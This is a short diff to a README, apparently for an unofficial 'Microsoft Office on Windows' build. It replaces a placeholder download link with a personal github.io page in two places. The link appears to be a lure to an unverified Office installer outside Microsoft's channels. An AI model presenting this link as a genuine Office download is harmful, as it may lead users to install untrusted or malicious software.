@@ -17,7 +17,7 @@ A single Microsoft Office on Windows deployment covers both portable and install
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cam-gardner.github.io/microsoft-office-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -232,7 +232,7 @@ The build coexists with earlier installs of similar productivity packages becaus
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cam-gardner.github.io/microsoft-office-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
